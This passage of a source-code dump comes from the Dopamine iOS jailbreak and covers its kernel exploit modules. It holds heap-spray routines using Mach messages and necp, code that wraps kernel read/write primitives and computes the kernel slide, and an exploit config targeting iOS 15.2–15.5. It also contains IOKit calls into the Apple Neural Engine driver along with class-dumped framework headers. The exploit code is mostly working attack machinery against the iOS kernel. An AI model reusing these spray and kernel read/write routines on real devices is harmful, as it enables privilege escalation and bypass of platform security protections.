    spray_default_kalloc_ool_ports_with_data_kalloc_size_on_port(size, ool_ports, 0x50, p);
}

void spray_default_kalloc_ool_ports_with_data_kalloc_size_on_port(unsigned int size, mach_port_t *ool_ports, unsigned int data_kalloc_size, mach_port_t p)
{
    struct default_msg
    {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t desc;
    };
    
    struct default_msg *msg = (struct default_msg *)calloc(1, 0x100);
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_bits  |= MACH_MSGH_BITS_COMPLEX;
    msg->hdr.msgh_size = data_kalloc_size;
    msg->body.msgh_descriptor_count = 1;
    
    msg->desc.deallocate = 0;
    msg->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->desc.copy = MACH_MSG_VIRTUAL_COPY;
    msg->desc.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc.count = size/8;
    msg->desc.address = (void *)ool_ports;
    
    msg->hdr.msgh_remote_port = p;
    kern_return_t kr = mach_msg_send((mach_msg_header_t *)msg);
    if (kr) {
        *(int *)1 = 0;
    }
    
    free(msg);
}


kern_return_t spray_kmsg_on_port(mach_port_t port, void *data, size_t size)
{
    mach_msg_base_t *msg = data;
    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->header.msgh_remote_port = port;
    msg->header.msgh_size = (mach_msg_size_t)size;
    
    return mach_msg_send(&msg->header);
}

mach_port_t *spray_ports_with_context(unsigned int count, uint64_t context)
{
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
    
    for (unsigned int i = 0; i < count; ++i)
    {
        mach_port_construct(mach_task_self(), &options, context, &ports[i]);
    }
    
    return ports;
}

mach_port_t *spray_ports(unsigned int count)
{
    return spray_ports_with_context(count, 0);
}

int spray_default_kalloc_necp(int necp_fd, uint8_t *b, uint32_t sz)
{
    uint8_t if_id[0x10];
    return necp_client_action(necp_fd, 1, if_id, sizeof(if_id), b, sz);
}


```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/spray.h`:

```h
#ifndef __SPRAY_H__
#define __SPRAY_H__

#include <mach/mach.h>
#include <stdint.h>

mach_port_t spray_data_kalloc_kmsg_single(uint8_t *data, unsigned int size);
mach_port_t *spray_data_kalloc_kmsg(uint8_t *data, unsigned int size, unsigned int count);
void spray_data_kalloc_kmsg_on_ports(uint8_t *data, unsigned int size, unsigned int count, mach_port_t *ports);
mach_port_t *spray_default_kalloc_ool_ports(unsigned int size, unsigned int count, mach_port_t *ool_ports);
mach_port_t *spray_default_kalloc_ool_ports_with_data_kalloc_size(unsigned int size, unsigned int count, mach_port_t *ool_ports, unsigned int data_kalloc_size);

void spray_default_kalloc_ool_ports_on_port(unsigned int size, unsigned int count, mach_port_t *ool_ports, mach_port_t p);
void spray_default_kalloc_ool_ports_with_data_kalloc_size_on_port(unsigned int size, mach_port_t *ool_ports, unsigned int data_kalloc_size, mach_port_t p);
int spray_default_kalloc_necp(int necp_fd, uint8_t *b, uint32_t sz);

kern_return_t spray_kmsg_on_port(mach_port_t port, void *data, size_t size);

mach_port_t *spray_ports(unsigned int count);
mach_port_t *spray_ports_with_context(unsigned int count, uint64_t context);


#endif

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/xpaci.h`:

```h
// ptrauth.h replacement

static uint64_t __attribute((naked)) __xpaci(uint64_t a)
{
    asm(".long        0xDAC143E0"); // XPACI X0
    asm("ret");
}

static uint64_t xpaci(uint64_t a)
{
    // If a looks like a non-pac'd pointer just return it
    if ((a & 0xFFFFFF0000000000) == 0xFFFFFF0000000000)
    {
        return a;
    }
    
    return __xpaci(a);
}

```

`Application/Dopamine/Exploits/multicast_bytecopy/multicast_bytecopy.h`:

```h
//
//  multicast_bytecopy.h
//  multicast_bytecopy
//
//  Created by Lars Fröder on 27.04.24.
//

#import <Foundation/Foundation.h>

//! Project version number for multicast_bytecopy.
FOUNDATION_EXPORT double multicast_bytecopyVersionNumber;

//! Project version string for multicast_bytecopy.
FOUNDATION_EXPORT const unsigned char multicast_bytecopyVersionString[];

// In this header, you should import all the public headers of your framework using statements like #import <multicast_bytecopy/PublicHeader.h>



```

`Application/Dopamine/Exploits/multicast_bytecopy/multicast_bytecopy.m`:

```m
//
//  multicast_bytecopy.c
//  Dopamine
//
//  Created by Lars Fröder on 27.04.24.
//

#include <stdio.h>
#include "exploit/exploit.h"
#include "exploit/kernel_rw.h"
#import <libjailbreak/primitives_external.h>
#import <libjailbreak/info.h>

#define kread_from_method(type, method)                                             \
    do {                                                                            \
        volatile type* type_base = (volatile type*)(uaddr);                         \
        uint64_t type_size = ((size) / (sizeof(type)));                                  \
        for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {         \
            type type_value = method(kaddr + (type_offset * sizeof(type)));    \
            type_base[type_offset] = type_value;                                    \
        }                                                                           \
    } while (0)

#define kwrite_from_method(type, method)                                       \
    do {                                                                       \
        volatile type* type_base = (volatile type*)(uaddr);                    \
        uint64_t type_size = ((size) / (sizeof(type)));                             \
        for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {    \
            type type_value = type_base[type_offset];                          \
            method( kaddr + (type_offset * sizeof(type)), type_value);     \
        }                                                                      \
    } while (0)

int kreadbuf(uint64_t kaddr, void* uaddr, size_t size)
{
    switch (size) {
        case sizeof(uint8_t): {
            uint32_t r = kread32(kaddr);
            *(uint8_t *)uaddr = (uint8_t)r;
            break;
        }
        case sizeof(uint16_t): {
            uint32_t r = kread32(kaddr);
            *(uint16_t *)uaddr = (uint16_t)r;
            break;
        }
        default:
            kread_from_method(uint32_t, kread32);
            break;
    }
    return 0;
}

int kwritebuf(uint64_t kaddr, const void* uaddr, size_t size)
{
    switch (size) {
        case sizeof(uint8_t): {
            uint8_t r[8] = { 0 };
            kreadbuf(kaddr, r, sizeof(r));
            r[0] = *(uint8_t *)uaddr;
            kwrite64(kaddr, *(uint64_t *)r);
            break;
        }
        case sizeof(uint16_t): {
            uint16_t r[4] = { 0 };
            kreadbuf(kaddr, r, sizeof(r));
            r[0] = *(uint16_t *)uaddr;
            kwrite64(kaddr, *(uint64_t *)r);
            break;
        }
        default:
            kwrite_from_method(uint32_t, kwrite32);
            break;
    }
    return 0;
}

int exploit_init(const char *flavor)
{
    uint64_t kernelBase = 0;
    int r = exploit_get_krw_and_kernel_base(&kernelBase);
    if (r != 0) return r;
    
    gPrimitives.kreadbuf = kreadbuf;
    gPrimitives.kwritebuf = kwritebuf;
    gSystemInfo.kernelConstant.slide = kernelBase - kconstant(staticBase);
    
    return 0;
}


int exploit_deinit(void)
{
    if (gPrimitives.kreadbuf == kreadbuf) {
        gPrimitives.kreadbuf = NULL;
    }
    if (gPrimitives.kwritebuf == kwritebuf) {
        gPrimitives.kwritebuf = NULL;
    }

    exploitation_cleanup();
    return 0;
}

```

`Application/Dopamine/Exploits/weightBufs/Info.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>DPExploitFlavors</key>
	<dict>
		<key>default</key>
		<dict>
			<key>DPFlavorPriority</key>
			<integer>800</integer>
			<key>DPSupportExclude</key>
			<array>
				<dict>
					<key>Devices</key>
					<array>
						<string>arm64</string>
					</array>
				</dict>
			</array>
			<key>DPSupportedRanges</key>
			<array>
				<dict>
					<key>End</key>
					<string>15.5</string>
					<key>Start</key>
					<string>15.2</string>
				</dict>
			</array>
		</dict>
	</dict>
	<key>DPExploitType</key>
	<string>Kernel</string>
</dict>
</plist>

```

`Application/Dopamine/Exploits/weightBufs/exploit/ANEDirectIn.c`:

```c
#include "ANEDirectIn.h"

kern_return_t do__ANEDirect_ProgramSendRequest(io_connect_t client,mach_port_t port, void *address)
{

        uint32_t structInputCnt = 16;
        uint32_t structOutputCnt = 0;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        uint64_t * input = (uint64_t *)args->sInput;
        input[0] = (uint64_t)address;
        input[1] = 0xA60;

        args->client = client;
        args->asyncAwake = port;
        kern_return_t kr = IOConnectCallAsyncMethod(args->client,
                                                    2,
                                                    args->asyncAwake,
                                                    args->references,
                                                    8,
                                                    args->scalarI,args->scalarISize,
                                                    args->sInput, args->sInputSize,
                                                    args->scalarO, (uint32_t *)&args->scalarOSize,
                                                    args->sOutput, (size_t *)&args->sOutputSize);
        /* printf("_ANE_ProgramSendRequest status -> kr = (0x%x) %s\n",kr, mach_error_string(kr)); */
        destroy_args(args);
        return kr;
}

kern_return_t do__ANEDriect_DeviceOpen(io_connect_t client,void *in)
{

        uint32_t structInputCnt = 88;
        uint32_t structOutputCnt = 88;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        uint8_t * input = (uint8_t *)args->sInput;
        args->sInput = (uint8_t *)in;

        args->client = client;

        kern_return_t kr = IOConnectCallMethod(args->client,
                                               0,
                                               args->scalarI,args->scalarISize,
                                               args->sInput, args->sInputSize,
                                               args->scalarO, (uint32_t *)&args->scalarOSize,
                                               args->sOutput, (size_t *)&args->sOutputSize);
        if(kr)
                printf("_ANEDirect_DeviceOpen status -> kr = (0x%x) %s\n",kr, mach_error_string(kr));
        args->sInput = input;
        memcpy(in,args->sOutput,structInputCnt);
        destroy_args(args);
        return kr;
}

```

`Application/Dopamine/Exploits/weightBufs/exploit/ANEDirectIn.h`:

```h
#ifndef _H_ANEDIRECTIN_H
#define _H_ANEDIRECTIN_H

#include "iokit.h"

struct H11ANEDeviceInfoStruct {
        uint64_t fields[0x58/8];
};

typedef struct
{
        uint64_t programHandle;
        uint64_t field_8;
        unsigned int procedureId;
        uint32_t field_14;
        uint64_t field_18;
        uint64_t field_20;
        unsigned int total_InputBuffers;
        char inputBufferSymbolIndex[256];
        uint32_t inputBufferSurfaceId[255];
        unsigned int total_OutputBuffers;
        char OutputBuffers[256];
        uint32_t outputBufferSurfaceId[255];
        unsigned int total_IntermediateBuffers;
        uint IntermediateBufferSurfaceId[3];
        uint64_t callBack;
        uint64_t refCon;
        char field_A48;
        char field_A49;
        char field_A4A;
        char field_A4B;
        uint32_t weightsBufferSurfaceId;
        uint64_t EventsAddr;
        uint64_t field_A58;
} H11ANEProgramRequestArgsStruct;

kern_return_t do__ANEDriect_DeviceOpen(io_connect_t client,void *in);
kern_return_t do__ANEDirect_ProgramSendRequest(io_connect_t client,mach_port_t port, void *address);

#endif  /* _H_ANEDIRECTIN_H */

```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/AppleNeuralEngine-Structs.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/

typedef struct _NSZone* NSZoneRef;

typedef struct os_unfair_lock_s {
	unsigned _os_unfair_lock_opaque;
} os_unfair_lock_s;

typedef struct __IOSurface* IOSurfaceRef;

typedef struct {

} SCD_Struct_AN3;


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/AppleNeuralEngine.h`:

```h
#import <AppleNeuralEngine/_ANEDeviceInfo.h>
#import <AppleNeuralEngine/_ANEDataReporter.h>
#import <AppleNeuralEngine/_ANEProgramForEvaluation.h>
#import <AppleNeuralEngine/_ANEModel.h>
#import <AppleNeuralEngine/_ANEHashEncoding.h>
#import <AppleNeuralEngine/_ANERequest.h>
#import <AppleNeuralEngine/_ANELog.h>
#import <AppleNeuralEngine/_ANEQoSMapper.h>
#import <AppleNeuralEngine/_ANEStrings.h>
#import <AppleNeuralEngine/_ANEDaemonConnection.h>
#import <AppleNeuralEngine/_ANEPerformanceStats.h>
#import <AppleNeuralEngine/_ANEIOSurfaceObject.h>
#import <AppleNeuralEngine/_ANEDeviceController.h>
#import <AppleNeuralEngine/_ANEClient.h>
#import <AppleNeuralEngine/_ANEErrors.h>
#import <AppleNeuralEngine/_ANECloneHelper.h>

```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/NSCopying.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@protocol NSCopying
@required
-(id)copyWithZone:(NSZone*)arg1;

@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/NSSecureCoding.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@protocol NSSecureCoding <NSCoding>
@required
+(BOOL)supportsSecureCoding;

@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEClient.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@class _ANEDaemonConnection, NSArray;

@interface _ANEClient : NSObject {

	_ANEDaemonConnection* _conn;
	NSArray* _queues;

}

@property (nonatomic,readonly) _ANEDaemonConnection * conn;              //@synthesize conn=_conn - In the implementation block
@property (nonatomic,readonly) NSArray * queues;                         //@synthesize queues=_queues - In the implementation block
+(void)initialize;
+(id)sharedPrivateConnection;
+(id)sharedConnection;
+(id)sandboxExtensionForModel:(id)arg1 ;
-(BOOL)echo:(id)arg1 ;
-(_ANEDaemonConnection *)conn;
-(NSArray *)queues;
-(void)dealloc;
-(BOOL)compiledModelExistsFor:(id)arg1 ;
-(void)purgeCompiledModel:(id)arg1 ;
-(BOOL)loadRealTimeModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(BOOL)loadModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(BOOL)unloadRealTimeModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(BOOL)unloadModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(BOOL)evaluateRealTimeWithModel:(id)arg1 options:(id)arg2 request:(id)arg3 error:(id*)arg4 ;
-(BOOL)evaluateWithModel:(id)arg1 options:(id)arg2 request:(id)arg3 qos:(unsigned)arg4 error:(id*)arg5 ;
-(BOOL)compileModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(id)initWithRestrictedAccessAllowed:(BOOL)arg1 ;
-(BOOL)doLoadModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(BOOL)doEvaluateDirectWithModel:(id)arg1 options:(id)arg2 request:(id)arg3 qos:(unsigned)arg4 error:(id*)arg5 ;
-(BOOL)doUnloadModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(BOOL)beginRealTimeTask;
-(BOOL)endRealTimeTask;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANECloneHelper.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANECloneHelper : NSObject
+(BOOL)shouldSkipCloneFor:(id)arg1 isEncryptedModel:(BOOL)arg2 ;
+(id)cloneIfWritable:(id)arg1 isEncryptedModel:(BOOL)arg2 cloneDirectory:(id)arg3 ;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEDaemonConnection.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/

#import <libobjc.A.dylib/_ANEDaemonProtocol.h>

@class NSXPCConnection;

@interface _ANEDaemonConnection : NSObject <_ANEDaemonProtocol> {

	BOOL _restricted;
	NSXPCConnection* _daemonConnection;

}

@property (nonatomic,readonly) NSXPCConnection * daemonConnection;              //@synthesize daemonConnection=_daemonConnection - In the implementation block
@property (nonatomic,readonly) BOOL restricted;                                 //@synthesize restricted=_restricted - In the implementation block
+(id)daemonConnection;
+(id)daemonConnectionRestricted;
-(void)dealloc;
-(BOOL)restricted;
-(id)init;
-(NSXPCConnection *)daemonConnection;
-(id)initWithMachServiceName:(id)arg1 restricted:(BOOL)arg2 ;
-(void)beginRealTimeTaskWithReply:(/*^block*/id)arg1 ;
-(void)endRealTimeTaskWithReply:(/*^block*/id)arg1 ;
-(void)echo:(id)arg1 withReply:(/*^block*/id)arg2 ;
-(void)compileModel:(id)arg1 sandboxExtension:(id)arg2 options:(id)arg3 qos:(unsigned)arg4 withReply:(/*^block*/id)arg5 ;
-(void)loadModel:(id)arg1 sandboxExtension:(id)arg2 options:(id)arg3 qos:(unsigned)arg4 withReply:(/*^block*/id)arg5 ;
-(void)unloadModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 withReply:(/*^block*/id)arg4 ;
-(void)compiledModelExistsFor:(id)arg1 withReply:(/*^block*/id)arg2 ;
-(void)purgeCompiledModel:(id)arg1 withReply:(/*^block*/id)arg2 ;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEDaemonProtocol.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@protocol _ANEDaemonProtocol
@required
-(void)compileModel:(id)arg1 sandboxExtension:(id)arg2 options:(id)arg3 qos:(unsigned)arg4 withReply:(/*^block*/id)arg5;
-(void)loadModel:(id)arg1 sandboxExtension:(id)arg2 options:(id)arg3 qos:(unsigned)arg4 withReply:(/*^block*/id)arg5;
-(void)unloadModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 withReply:(/*^block*/id)arg4;
-(void)compiledModelExistsFor:(id)arg1 withReply:(/*^block*/id)arg2;
-(void)purgeCompiledModel:(id)arg1 withReply:(/*^block*/id)arg2;

@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEDataReporter.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANEDataReporter : NSObject
+(void)addValue:(long long)arg1 forScalarKey:(id)arg2 ;
+(void)setValue:(long long)arg1 forScalarKey:(id)arg2 ;
+(void)clearScalarKey:(id)arg1 ;
+(id)aggdKey:(id)arg1 ;
+(id)reportClient:(id)arg1 modelName:(id)arg2 ;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEDeviceController.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@protocol OS_dispatch_queue;
#import <AppleNeuralEngine/AppleNeuralEngine-Structs.h>
@class NSObject;

@interface _ANEDeviceController : NSObject {

	BOOL _isPrivileged;
	NSObject*<OS_dispatch_queue> _q;
	long long _usecount;
	unsigned long long _programHandle;
	SCD_Struct_AN3* _device;

}

@property (q,nonatomic,readonly) NSObject*<OS_dispatch_queue> q;              //@synthesize q=_q - In the implementation block
@property (assign,nonatomic) long long usecount;                              //@synthesize usecount=_usecount - In the implementation block
@property (nonatomic,readonly) BOOL isPrivileged;                             //@synthesize isPrivileged=_isPrivileged - In the implementation block
@property (assign,nonatomic) unsigned long long programHandle;                //@synthesize programHandle=_programHandle - In the implementation block
@property (assign,nonatomic) SCD_Struct_AN3* device;                          //@synthesize device=_device - In the implementation block
+(id)controllerWithProgramHandle:(unsigned long long)arg1 ;
+(id)sharedPrivilegedConnection;
-(NSObject*<OS_dispatch_queue>)q;
-(SCD_Struct_AN3*)device;
-(void)start;
-(void)setDevice:(SCD_Struct_AN3*)arg1 ;
-(void)stop;
-(BOOL)isPrivileged;
-(unsigned long long)programHandle;
-(void)setProgramHandle:(unsigned long long)arg1 ;
-(id)initWithProgramHandle:(unsigned long long)arg1 priviledged:(BOOL)arg2 ;
-(long long)usecount;
-(void)setUsecount:(long long)arg1 ;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEDeviceInfo.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANEDeviceInfo : NSObject
+(BOOL)isInternalBuild;
+(BOOL)hasANE;
+(id)bootArgs;
+(id)buildVersion;
+(id)aneSubType;
+(BOOL)precompiledModelChecksDisabled;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEErrors.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANEErrors : NSObject
+(id)createErrorWithCode:(long long)arg1 description:(id)arg2 ;
+(id)programInferenceOverflowErrorForMethod:(id)arg1 ;
+(id)programInferenceOtherErrorForMethod:(id)arg1 ;
+(id)entitlementErrorForMethod:(id)arg1 ;
+(id)priorityErrorForMethod:(id)arg1 ;
+(id)timeoutErrorForMethod:(id)arg1 ;
+(id)programCreationErrorForMethod:(id)arg1 ;
+(id)programLoadErrorForMethod:(id)arg1 ;
+(id)missingCodeSigningErrorForMethod:(id)arg1 ;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEHashEncoding.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANEHashEncoding : NSObject
+(id)hexStringFor:(id)arg1 ;
+(void)copySHA256For:(id)arg1 toBuffer:(char*)arg2 ;
+(unsigned)hashFor:(id)arg1 seed:(unsigned)arg2 ;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEIOSurfaceObject.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


#import <AppleNeuralEngine/AppleNeuralEngine-Structs.h>
@interface _ANEIOSurfaceObject : NSObject {

	IOSurfaceRef _ioSurface;

}

@property (nonatomic,readonly) IOSurfaceRef ioSurface;              //@synthesize ioSurface=_ioSurface - In the implementation block
+(id)new;
+(id)objectWithIOSurface:(IOSurfaceRef)arg1 ;
+(IOSurfaceRef)createIOSurfaceWithWidth:(int)arg1 pixel_size:(int)arg2 height:(int)arg3 ;
-(id)initWithIOSurface:(IOSurfaceRef)arg1 ;
-(IOSurfaceRef)ioSurface;
-(void)dealloc;
-(id)init;
-(id)description;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANELog.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANELog : NSObject
+(id)tool;
+(id)daemon;
+(id)common;
+(id)service;
+(id)framework;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEModel.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/

//#import <AppleNeuralEngine/AppleNeuralEngine-Structs.h>
#import "AppleNeuralEngine-Structs.h"

//#import <libobjc.A.dylib/NSCopying.h>
//#import <libobjc.A.dylib/NSSecureCoding.h>

@class NSURL, NSString, NSDictionary, _ANEProgramForEvaluation;

@interface _ANEModel : NSObject <NSCopying, NSSecureCoding> {

	char _queueDepth;
	unsigned _perfStatsMask;
	os_unfair_lock_s _l;
	NSURL* _modelURL;
	NSString* _key;
	unsigned long long _string_id;
	unsigned long long _programHandle;
	unsigned long long _intermediateBufferHandle;
	NSDictionary* _modelAttributes;
	_ANEProgramForEvaluation* _program;

}

@property (nonatomic,retain) NSDictionary * modelAttributes;                           //@synthesize modelAttributes=_modelAttributes - In the implementation block
@property (assign,nonatomic) unsigned long long programHandle;                         //@synthesize programHandle=_programHandle - In the implementation block
@property (assign,nonatomic) char queueDepth;                                          //@synthesize queueDepth=_queueDepth - In the implementation block
@property (assign,nonatomic) unsigned long long intermediateBufferHandle;              //@synthesize intermediateBufferHandle=_intermediateBufferHandle - In the implementation block
@property (assign,nonatomic) os_unfair_lock_s l;                                     //@synthesize l=_l - In the implementation block
@property (nonatomic,retain) _ANEProgramForEvaluation * program;                       //@synthesize program=_program - In the implementation block
@property (assign,nonatomic) unsigned perfStatsMask;                                   //@synthesize perfStatsMask=_perfStatsMask - In the implementation block
@property (nonatomic,readonly) NSURL * modelURL;                                       //@synthesize modelURL=_modelURL - In the implementation block
@property (nonatomic,copy,readonly) NSString * key;                                    //@synthesize key=_key - In the implementation block
@property (nonatomic,readonly) unsigned long long string_id;                           //@synthesize string_id=_string_id - In the implementation block
+(id)new;
+(BOOL)supportsSecureCoding;
+(id)modelAtURL:(id)arg1 key:(id)arg2 ;
+(id)sandboxExtensionPathsForModelURL:(id)arg1 ;
+(id)modelAtURL:(id)arg1 key:(id)arg2 modelAttributes:(id)arg3 ;
-(os_unfair_lock_s)l;
-(id)copyWithZone:(NSZone*)arg1 ;
-(NSString *)key;
-(void)setL:(os_unfair_lock_s)arg1 ;
-(void)dealloc;
-(void)reset;
-(id)init;
-(BOOL)isEqual:(id)arg1 ;
-(id)initWithCoder:(id)arg1 ;
-(NSURL *)modelURL;
-(void)setProgram:(_ANEProgramForEvaluation *)arg1 ;
-(void)encodeWithCoder:(id)arg1 ;
-(_ANEProgramForEvaluation *)program;
-(NSDictionary *)modelAttributes;
-(unsigned long long)intermediateBufferHandle;
-(unsigned long long)hash;
-(id)description;
-(unsigned long long)programHandle;
-(char)queueDepth;
-(void)setProgramHandle:(unsigned long long)arg1 ;
-(void)setIntermediateBufferHandle:(unsigned long long)arg1 ;
-(unsigned long long)string_id;
-(unsigned)perfStatsMask;
-(id)initWithModelAtURL:(id)arg1 key:(id)arg2 modelAttributes:(id)arg3 ;
-(void)setModelAttributes:(NSDictionary *)arg1 ;
-(void)setQueueDepth:(char)arg1 ;
-(BOOL)isEqualToModel:(id)arg1 ;
-(void)updateModelAttributes:(id)arg1 ;
-(void)updateModelAttributes:(id)arg1 programHandle:(unsigned long long)arg2 intermediateBufferHandle:(unsigned long long)arg3 queueDepth:(char)arg4 ;
-(id)keyForBundleID:(id)arg1 ;
-(void)setPerfStatsMask:(unsigned)arg1 ;
@end


```

`Application/Dopamine/Exploits/weightBufs/exploit/AppleNeuralEngine/_ANEPerformanceStats.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
